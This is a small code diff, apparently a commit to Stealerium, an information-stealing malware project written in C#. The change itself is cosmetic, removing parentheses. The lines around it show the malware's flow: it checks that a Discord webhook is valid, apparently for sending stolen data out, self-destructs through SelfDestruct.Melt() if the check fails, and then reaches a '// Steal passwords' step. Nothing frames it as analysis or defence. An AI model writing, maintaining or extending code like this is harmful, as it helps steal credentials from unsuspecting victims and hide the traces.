@@ -52,7 +52,7 @@ namespace Stealerium
             Config.Init();
 
             // Test Webhook if valid
-            if (!(await DiscordWebHook.WebhookIsValid()))
+            if (!await DiscordWebHook.WebhookIsValid())
                 SelfDestruct.Melt();
 
             // Steal passwords
